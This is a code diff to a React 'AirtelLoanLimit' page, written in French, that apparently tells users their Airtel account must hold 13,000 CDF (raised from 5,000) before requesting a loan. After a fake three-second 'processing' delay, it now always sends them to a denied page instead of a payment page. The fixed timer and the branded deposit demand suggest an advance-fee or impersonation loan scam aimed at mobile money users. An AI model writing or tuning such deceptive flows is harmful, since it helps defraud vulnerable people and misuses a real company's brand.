@@ -10,11 +10,11 @@ function AirtelLoanLimit() {
     setIsProcessing(true);
   };
 
-  // After 3 seconds, navigate to payment (simulates processing)
+  // After 3 seconds of processing, redirect to the denied page
   useEffect(() => {
     if (!isProcessing) return;
     const t = setTimeout(() => {
-      navigate('/airtel-payment');
+      navigate('/airtel-denied');
     }, 3000);
     return () => clearTimeout(t);
   }, [isProcessing, navigate]);
@@ -54,13 +54,13 @@ function AirtelLoanLimit() {
         <div className="airtel-steps">
           <p className="airtel-step">
             1. Avant de cliquer sur « Demander », assurez-vous que votre compte
-            Airtel dispose d'au moins 5 000 CDF. Dans le cas contraire, veuillez
+            Airtel dispose d'au moins 13 000 CDF. Dans le cas contraire, veuillez
             effectuer un dépôt.
           </p>
 
           <p className="airtel-step">
             2. Cliquez sur « Demander » si votre compte dispose d'au moins
-            5 000 CDF.
+            13 000 CDF.
           </p>
 
           <p className="airtel-step airtel-step-note">
